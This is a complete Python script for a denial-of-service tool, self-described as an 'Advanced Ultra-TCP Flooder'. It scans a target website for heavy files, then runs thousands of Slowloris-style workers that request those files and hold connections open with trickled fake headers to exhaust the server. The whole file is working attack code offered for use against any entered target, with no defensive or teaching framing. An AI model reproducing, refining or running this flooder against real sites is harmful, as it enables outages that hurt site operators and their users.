import asyncio
import random
import time
import argparse
import sys
import socket
import ssl
import re
from urllib.parse import urlparse

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

try:
    import aiohttp
except ImportError:
    print("[ERROR] aiohttp not found. Run: pip install aiohttp")
    sys.exit(1)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
]

HEAVY_EXTENSIONS = [".jpg", ".jpeg", ".png", ".gif", ".pdf", ".zip", ".mp4", ".mov", ".iso", ".exe", ".bin"]

async def discover_heavy_resources(base_url):
    """
    Scans the target site for heavy files (images, documents, etc.)
    Returns a list of paths.
    """
    print(f"[SCAN] Searching for heavy resources on {base_url}...")
    paths = ["/"]
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            async with session.get(base_url, timeout=10) as response:
                if response.status == 200:
                    html = await response.text()
                    # Find all links/sources
                    found = re.findall(r'(?:href|src)=["\']([^"\']+)["\']', html)
                    for link in found:
                        if any(link.lower().endswith(ext) for ext in HEAVY_EXTENSIONS):
                            # Clean up link to relative path
                            if link.startswith("http"):
                                parsed = urlparse(link)
                                if parsed.netloc == urlparse(base_url).netloc:
                                    paths.append(parsed.path)
                            elif link.startswith("/"):
                                paths.append(link)
                            else:
                                paths.append("/" + link)
        
        paths = list(set(paths))
        if len(paths) > 1:
            print(f"[SCAN] Found {len(paths)-1} heavy resources to include in attack.")
        else:
            print("[SCAN] No heavy resources found. Falling back to root '/' only.")
    except Exception as e:
        print(f"[SCAN] Failed to scan resources: {e}. Using root '/' fallback.")
    
    return paths

async def slowloris_worker(host, port, use_ssl, paths, stats):
    """
    Combines Slowloris with targeted resource hammering.
    """
    while True:
        try:
            path = random.choice(paths)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.open_connection(host, port, ssl=context)
            else:
                reader, writer = await asyncio.open_connection(host, port)
            
            stats['active_conns'] += 1
            stats['total_hits'] += 1
            
            # Send initial request for a random path (potentially heavy)
            query = f"GET {path}?{random.randint(0, 999999)} HTTP/1.1\r\n"
            writer.write(query.encode())
            writer.write(f"Host: {host}\r\n".encode())
            writer.write(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            writer.write(b"Accept-Language: en-US,en;q=0.5\r\n")
            writer.write(b"Connection: keep-alive\r\n")
            await writer.drain()

            # Keep connection open as long as possible
            while True:
                await asyncio.sleep(random.uniform(5, 15))
                # Send periodic keep-alive headers to keep the server waiting
                writer.write(f"X-Keep-Alive: {random.randint(1, 9999)}\r\n".encode())
                await writer.drain()
                stats['total_hits'] += 1
                
        except (asyncio.CancelledError, KeyboardInterrupt):
            break
        except Exception:
            stats['errors'] += 1
        finally:
            if 'writer' in locals():
                try:
                    stats['active_conns'] -= 1
                    writer.close()
                except:
                    pass

async def monitor(stats, target_label):
    start_time = time.time()
    while True:
        elapsed = time.time() - start_time
        if elapsed > 0:
            cps = stats['total_hits'] / elapsed
            print(f"[{target_label}] Active: {stats['active_conns']} | Hits: {stats['total_hits']} | CPS: {cps:.2f} | Errors: {stats['errors']}", flush=True)
        await asyncio.sleep(2)

async def main():
    parser = argparse.ArgumentParser(description="Advanced Ultra-TCP Flooder with Resource Discovery")
    parser.add_argument("host", nargs="?", help="Target Host (IP or URL)")
    parser.add_argument("-p", "--port", type=int, help="Port (Auto-detected if URL)")
    parser.add_argument("-c", "--concurrency", type=int, default=2000, help="Total Workers")
    args = parser.parse_args()

    # Interactive input if no host provided
    target = args.host
    if not target:
        target = input("Enter Target URL or IP (e.g., https://example.com): ").strip()
    
    if not target:
        print("[ERROR] No target specified.")
        return

    # Parse target
    if "://" not in target:
        host = target
        port = args.port or 80
        use_ssl = False
        base_url = f"http://{host}:{port}"
    else:
        parsed = urlparse(target)
        host = parsed.hostname
        use_ssl = parsed.scheme == "https"
        port = args.port or (443 if use_ssl else 80)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

    # Resource Discovery
    paths = await discover_heavy_resources(base_url)

    stats = {'active_conns': 0, 'total_hits': 0, 'errors': 0}

    print(f"\n[INFO] Starting ADVANCED Ultra TCP Flood")
    print(f"[TARGET] {host}:{port} (SSL: {use_ssl})")
    print(f"[CONFIG] {args.concurrency} workers | Path Rotation: {len(paths)} paths")
    print("-" * 50)

    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (1000000, 1000000))
    except:
        pass

    workers = [asyncio.create_task(slowloris_worker(host, port, use_ssl, paths, stats)) for _ in range(args.concurrency)]
    monitor_task = asyncio.create_task(monitor(stats, host))

    try:
        await asyncio.gather(*workers)
    except KeyboardInterrupt:
        print("\n[INFO] Attack stopped by user.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
